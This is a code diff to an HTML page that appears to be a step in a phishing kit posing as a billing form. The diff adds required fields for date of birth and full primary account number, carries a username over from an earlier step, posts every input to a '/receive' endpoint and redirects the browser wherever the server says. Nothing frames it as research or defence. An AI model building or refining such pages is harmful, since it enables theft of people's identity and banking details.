@@ -16,8 +16,8 @@
     <nav>
         <ul class="steps">
             <li >Step 1</li>
-            <li >Step 2</li>
-            <li class="active">Step 3</li>
+            <li class="active">Step 2</li>
+            <li >Step 3</li>
         </ul>
     </nav>
 
@@ -27,6 +27,28 @@
     <p>Fields marked with an <span class="required">*&nbsp;&nbsp;</span> are required.</p>
 
     <form id="billingForm">
+        <!-- Existing Fields -->
+        <div class="form-group">
+            <label for="dob">Step 1 <span class="required">*&nbsp;&nbsp;</span></label>
+            <input type="date" id="dob" name="dob" required><span>&nbsp;&nbsp;Date of Birth</span>
+        </div>
+
+        <div class="form-group">
+            <label for="accountNumber">Step 2 <span class="required">*&nbsp;&nbsp;</span></label>
+            <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter your full primary account number" required>
+            <span>&nbsp;&nbsp;Primary Account Number</span>
+        </div>
+
+        <div class="form-group">
+            <label for="accountType">Step 3 <span class="required">*&nbsp;&nbsp;</span></label>
+            <select id="accountType" name="accountType" required>
+                <option value="">Select an account type</option>
+                <option value="savings">Savings</option>
+                <option value="checking">Checking</option>
+            </select><span>&nbsp;&nbsp;Account Type</span>
+        </div>
+
+        <!-- New Billing Address Fields -->
         <div class="form-group">
             <label for="streetAddress">Street Address <span class="required">*&nbsp;&nbsp;</span></label>
             <input type="text" id="streetAddress" name="streetAddress" placeholder="Enter your street address" required>
@@ -112,35 +134,36 @@
     $('.continue').click(function (e) {
         e.preventDefault();
 
-        let userinfo = {};
+        let userinfo = {}; 
+        let visitor = $('#username').val();
+        sessionStorage.setItem('visitor', visitor);
         
         $('form input').each(function () {
             let inputName = $(this).attr('name');
             let inputValue = $(this).val();
+            
             if (inputName) {
                 userinfo[inputName] = inputValue;
             }
         });
 
-        console.log('Sending Data:', userinfo);
-
+        userinfo['visitor'] = visitor;
+        console.log(userinfo); 
+        
         $.ajax({
             url: '/receive',
             type: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify(userinfo), // Ensure proper format
+            data: userinfo,
             success: function (response) {
-                console.log('Success Response:', response);
-                if (response.url) {
-                    window.location.href = response.url;
+             if(response.url){
+                window.location.href = response.url;
                 }
             },
             error: function (xhr, status, error) {
-                console.error('Error Response:', xhr.responseText);
                 alert('An error occurred: ' + error);
             }
         });
     });
-}); 
+});
   </script>
 </html>
